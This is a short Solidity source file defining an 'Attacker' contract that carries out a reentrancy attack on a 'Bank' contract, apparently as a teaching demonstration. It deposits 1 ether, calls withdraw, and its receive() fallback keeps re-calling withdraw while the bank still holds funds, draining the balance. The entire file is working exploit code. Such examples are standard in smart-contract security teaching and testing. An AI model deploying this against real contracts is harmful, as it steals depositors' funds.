// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Bank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    Bank bank;

    constructor(Bank _bank) payable {
        bank = Bank(_bank);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Nenhum valor informado");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}